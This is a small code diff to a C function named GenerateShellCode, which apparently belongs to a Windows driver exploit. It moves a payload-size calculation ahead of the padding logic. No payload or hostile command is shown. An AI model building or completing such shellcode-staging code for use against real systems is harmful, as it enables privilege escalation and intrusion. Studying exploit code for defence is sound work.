@@ -310,6 +310,7 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     payloadRemander = payloadSize % 8; 
 
+    payloadSizeInEight = (int ) (payloadSize / 8);
     //Calculate the padding
     if (payloadRemander != 0) 
     {
@@ -324,7 +325,6 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     RtlMoveMemory(shellcode,payload,oldPayloadSize);
 
-    payloadSizeInEight = (int ) (payloadSize / 8);
     printf("[+] Payload size by eigth: %i\n",payloadSizeInEight);
 
     for (int i = 0; i < payloadSizeInEight;i++)
